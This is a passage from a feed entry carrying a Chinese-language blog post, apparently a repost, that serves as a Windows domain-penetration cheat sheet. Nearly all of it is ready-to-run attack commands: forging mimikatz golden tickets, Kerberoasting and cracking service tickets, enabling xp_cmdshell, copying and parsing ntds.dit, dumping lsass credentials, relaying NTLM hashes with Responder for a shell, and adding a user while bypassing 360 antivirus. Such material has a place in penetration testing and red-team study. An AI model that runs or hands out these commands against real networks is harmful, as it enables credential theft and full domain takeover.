class="line">#id-&gt;域用户的ID</span><br><span class="line">misc::cmd</span><br><span class="line">#派发shell</span><br></pre></td></tr></table></figure><p>黄金票据<br>利用krbtgt密码的hash。获得域管权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge</span><br><span class="line">#清空票据</span><br><span class="line">kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116 /domain:offensive.local /rc4:61d83c569b93bfcd4ca2087011361caa /user:idontexist /id:500</span><br><span class="line">#输入krbtgt的ntlm。SUID。生成票据</span><br><span class="line">kerberos::ptt ticket.kirbi</span><br><span class="line">#导入票据</span><br><span class="line">misc::cmd</span><br><span class="line">#得到shell</span><br></pre></td></tr></table></figure><h1 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#x27;MSSQLSvc/Offensive-SQL1:1433&#x27;</span><br><span class="line">#powershell执行。请求票据</span><br><span class="line"></span><br><span class="line">kerberos::list /export</span><br><span class="line">#mimikatz执行。提取刚刚获得的票据</span><br><span class="line"></span><br><span class="line">python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;</span><br><span class="line">利用pass.txt爆破刚刚提取出来的票据</span><br></pre></td></tr></table></figure><p>Mssql xp_cmdshell被禁用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><h1 id="ntds-dit"><a href="#ntds-dit" class="headerlink" title="ntds.dit"></a>ntds.dit</h1><p>用自带的工具diskshadow</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c:\common.txt</span><br><span class="line"></span><br><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% i:</span><br><span class="line">exec &quot;cmd.exe&quot; /c copy i:\windows\ntds\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">reset</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>然后去c:/windows/system32执行<code>diskshadow /s c:\command.txt</code><br>就能得到ntds.dit</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">. .\Invoke-NinjaCopy.ps1</span><br><span class="line">#导入脚本</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\NTDS\ntds.dit -Verbose -LocalDestination &#x27;C:\Users\dbadmin\Desktop    \ntds.dit&#x27;</span><br><span class="line">#导出ntds.dit</span><br><span class="line">reg save HKLM\SYSTEM C:\Users\dbadmin\Desktop\SYS</span><br><span class="line">#导出SYSTEM</span><br><span class="line">Copy-Item &#x27;\\dc.offensive.local\C$\Users\dbadmin\Desktop\ntds.dit&#x27;-Destination &#x27;\\Client1.offensive.local\C$\Users\alice\Desktop\tools\ntds.dit&#x27;</span><br><span class="line">#复制到远程主机上</span><br></pre></td></tr></table></figure><h1 id="修复ntds-dit"><a href="#修复ntds-dit" class="headerlink" title="修复ntds.dit"></a>修复ntds.dit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl.exe /p &#x27;C:\Users\dbadmin\Desktop\ntds.dit&#x27; /!10240 /8 /o</span><br></pre></td></tr></table></figure><h1 id="解析ntds-dit"><a href="#解析ntds-dit" class="headerlink" title="解析ntds.dit"></a>解析ntds.dit</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">一。powershell</span><br><span class="line">Get-BootKey -SystemHivePath &#x27;SYS&#x27;</span><br><span class="line">$key = Get-BootKey -SystemHivePath &#x27;SYS&#x27;</span><br><span class="line">Get-ADDBAccount -All -DBPath &#x27;C:\Users\alice\Desktop\tools\ntds.dit&#x27; -BootKey $key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二。利用impacket-secretsdump</span><br><span class="line">impacket-secretsdump -system /root/Desktop/NTDS/SYSTEM -ntds /root/ntds.dit LOCAL</span><br></pre></td></tr></table></figure><h1 id="Kerberoasting攻击-1"><a href="#Kerberoasting攻击-1" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">. .\GetUserSPNs.ps1</span><br><span class="line"> Add-Type -AssemblyName System.IdentityModel</span><br><span class="line"> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#x27;MSSQLSvc/Offensive-SQL1:1433&#x27;</span><br><span class="line"> mimikatz # kerberos::list /export</span><br><span class="line"> python tgsrepcrack.py pass.txt &quot;*.kirbi&quot;</span><br></pre></td></tr></table></figure><h1 id="导出内存"><a href="#导出内存" class="headerlink" title="导出内存"></a>导出内存</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">rundll32 C:\windows\system32\comsvcs.dll, MiniDump 924 C:\lsass.dmp full</span><br><span class="line"></span><br><span class="line">powershell -c &quot;rundll32 C:\windows\system32\comsvcs.dll, MiniDump 1316 C:\lsass.dmp full&quot;</span><br><span class="line">#1316是lsass的进程ID。tasklist /svc|findstr lsass</span><br><span class="line"></span><br><span class="line">SqlDumper.exe 1316 0 0x01100</span><br><span class="line">#mssql的工具。1316照样是lsass.exe的PID</span><br><span class="line">sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span><br><span class="line">sekurlsa::logonPasswords full</span><br><span class="line"></span><br><span class="line">SharpDump.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">需要system权限</span><br><span class="line">C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.0.0\createdump.exe</span><br><span class="line">createdump.exe -u -f  xxx.dump  pid</span><br></pre></td></tr></table></figure><p>HASH Relay</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0</span><br><span class="line">python MultiRelay.py -t 192.168.0.4 -u ALL</span><br><span class="line">//要获取shell的目标IP</span><br><span class="line">然后客户机去访问192.168.0.4，中继到shell</span><br></pre></td></tr></table></figure><p>绕过360添加用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Argue net1 xxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">execute net1 user 123 123 /add</span><br><span class="line"></span><br><span class="line">https://github.com/lengjibo/RedTeamTools/tree/master/windows/bypass360%E5%8A%A0%E7%94%A8%E6%88%B7</span><br><span class="line">帐号：hacker 密码：P@ssw0rd</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;转载自guokeya&lt;br&gt;&lt;a href=&quot;https://guokeya.github.io/post/tFK-eJTet/&quot;&gt;https://guokeya.github.io/post/tFK-eJTet/&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="域渗透" scheme="https://bstark.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
